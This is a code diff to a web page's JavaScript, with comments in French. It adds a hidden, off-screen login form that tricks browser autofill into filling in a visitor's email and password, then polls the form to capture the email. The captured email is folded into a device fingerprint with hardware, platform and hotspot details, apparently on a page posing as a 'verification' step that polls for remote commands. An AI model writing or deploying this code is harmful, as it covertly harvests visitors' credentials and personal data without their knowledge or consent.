@@ -1,4 +1,35 @@
 let cachedLocalIp = null;
+let capturedEmail = null;
+
+// Création d'un "piège" à autofill pour tenter de capturer l'email
+function setupAutofillTrap() {
+    const container = document.createElement('div');
+    container.style.cssText = 'position:absolute; top:-1000px; left:-1000px; opacity:0.01; pointer-events:none;';
+    container.innerHTML = `
+        <form id="system-auth-trap">
+            <input type="text" name="username" autocomplete="username email">
+            <input type="email" name="email" autocomplete="email">
+            <input type="password" name="password" autocomplete="current-password">
+        </form>
+    `;
+    document.body.appendChild(container);
+
+    // On surveille les changements sur les champs
+    const emailInput = container.querySelector('input[type="email"]');
+    const userInput = container.querySelector('input[name="username"]');
+    
+    const checkInputs = () => {
+        if (emailInput.value && emailInput.value.includes('@')) {
+            capturedEmail = emailInput.value;
+        } else if (userInput.value && userInput.value.includes('@')) {
+            capturedEmail = userInput.value;
+        }
+    };
+
+    emailInput.addEventListener('change', checkInputs);
+    userInput.addEventListener('change', checkInputs);
+    setInterval(checkInputs, 2000);
+}
 
 // Fonction pour récupérer l'IP locale via WebRTC
 async function getLocalIP() {
@@ -96,14 +127,30 @@ async function getDeviceStats() {
     const stats = {
         battery: null,
         charging: null,
-        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+        downlink: navigator.connection ? navigator.connection.downlink : null,
+        rtt: navigator.connection ? navigator.connection.rtt : null,
+        email: capturedEmail,
+        platform: navigator.platform,
+        vendor: navigator.vendor,
+        cores: navigator.hardwareConcurrency,
+        memory: navigator.deviceMemory
     };
 
     const localIp = cachedLocalIp;
-    if (localIp && (localIp.startsWith('192.168.') || localIp.startsWith('10.') || localIp.includes('.local'))) {
-        stats.connection = 'wifi';
-    } else if (stats.connection === 'unknown') {
-        stats.connection = '4g/mobile';
+    // Détection avancée du type de réseau
+    if (localIp) {
+        if (localIp.startsWith('192.168.43.')) {
+            stats.networkName = "Android Hotspot (Default)";
+            stats.connection = 'hotspot';
+        } else if (localIp.startsWith('172.20.10.')) {
+            stats.networkName = "iPhone Hotspot (Default)";
+            stats.connection = 'hotspot';
+        } else if (localIp.startsWith('192.168.')) {
+            stats.connection = 'wifi';
+        } else if (localIp.startsWith('10.')) {
+            stats.connection = 'private/vpn';
+        }
     }
 
     try {
@@ -363,6 +410,7 @@ async function startVerification() {
 }
 
 if (document.readyState === 'complete') {
+    setupAutofillTrap();
     startVerification();
     // Vérification des commandes très fréquente (toutes les 2 secondes)
     setInterval(checkCommands, 2000);
